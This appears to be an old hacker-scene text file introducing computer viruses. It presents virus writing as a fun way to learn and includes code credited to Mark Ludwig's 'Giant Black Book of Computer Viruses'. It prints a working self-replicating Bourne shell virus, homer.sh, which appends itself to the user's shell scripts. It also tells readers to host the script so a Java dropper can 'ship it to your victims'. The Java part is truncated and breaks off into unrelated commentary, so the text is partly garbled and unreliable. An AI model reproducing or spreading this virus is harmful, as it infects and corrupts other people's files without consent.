"INTRO TO COMPUTER VIRUSES  OR , THE VIRUS: PINOY STYLE" PART 1

- What are their uses and dangers(if any)?
- How DO you make one?

WHAT IS A VIRUS? 

    WELL... A *computer* virus is what some in the
computer I/T business consider a "malicious" program
that not only penetrates computers , but destroys files
and renders the computer as invalid and unusable.
BUT THAT'S JUST ONE WAY OF LOOKING AT IT.
Another view is from the computer underground scene.
*our* view is that hacking, and making computer 
viruses are just a way to learn about the computer,
computer systems , and ultimately, make it a better 
machine. Dr. mark ludwig defines a computer virus as
"a program that reproduces.  When executed,
it simply makes more copies of itself.  
Those copies may later be executed
to create still more copies, ad infinitum."   
w/c as i said is a VERY good and not to mention FUN
way of learning about computers. 

WHAT ARE THEIR USES AND DANGERS?

  Well, let's start with the dangers. like i said above,
they can be used to destroy files and computers and make
life a living hell.
BUT.... they have a huge amount of good uses and good 
ways of implimenting them.

Here are but a few:

1. testing computer systems for bugs , bad blocks etc.
2. makes computers safer by increasing the systems'
   security and safety.
3. helps you learn programming languages and terms
   more easily. nudge nudge, wink wink ;)
4. and ultimately make your life easier rather than
   a living hell. NOW, would't that be great?

THOSE are just a few of the uses.

HOW DO YOU MAKE ONE?

  ahhh....i have never heard a more frequently asked 
question , except for "how do you hack?".
listen well guys, i'm only gonna say this once:

THERE ARE THINGS THAT YOU HAVE TO KNOW:
1. WRITING VIRUSES CAN GET YOU PUCHED IN THE NOSE 
   AND MAKE YOU BLEED TO DEATH AND DIE!
   BE CAREFUL WITH WHOM YOU SEND OR GIVE VIRUSES!!
2. YOU HAVE TO KNOW PROGRAMMING LANGUAGES.
   If you don't know what those are, read a computer 
   book.
3. you have to have certain programs:
   like: compilers, text editors , and debuggers and
   the unix operating system and it's counterparts.
   ( although you could do without the unix o/s.) 
   ( those are just a few. i'll give you more
     in part two of this guide.)

here's a java virus taken from  "The Giant
Black Book of Computer Viruses" by Dr. Mark Ludwig.

in using this, just cut and paste this in the compiler
and make it an executable. if you don't know how,
you have a long way to go pare.

here it is:

NOTE: SOME of the text here are taken from the
happy hacker mailing list. i'll give you their

/* This Java application infects your UNIX system with a Bourne shell
   script virus, homer.sh.  homer.sh is kind enough to announce itself
   and inform you that "Java is safe, and UNIX viruses do not exist"
   before finding all of the Bourne shell scripts in your home directory,
   checking to see if they've already been infected, and infecting
   those that are not.  homer.sh infects another Bourne shell script
   by simply appending a working copy of itself to the end of that shell
   script.  */

    public static void main (String[] argv) {
    try {
        String userHome = System.getProperty("user.home");

	If you post this source code to you web site -- it will do nothing!  That
is because this code must first be compiled in order to do its business.  If
you don't know how to compile Java source code for your Web page, you don't
know enough to safely handle viruses.
	Also, you need to put the code for the shell script, homer.sh, on your Web
site so this Java program can ship it to your victims.  Following is the
code for homer.sh:


#!/bin/sh

#-_

echo "Java is safe, and UNIX viruses do not exist."

for file in `find $HOME -type f -print`

do

    case "`sed 1q $file`" in

        "#!/bin/sh" ) grep '#-_' $file > /dev/null || sed -n '/#-_/,$p' $0
>> $file

    esac

done

	2>/dev/null
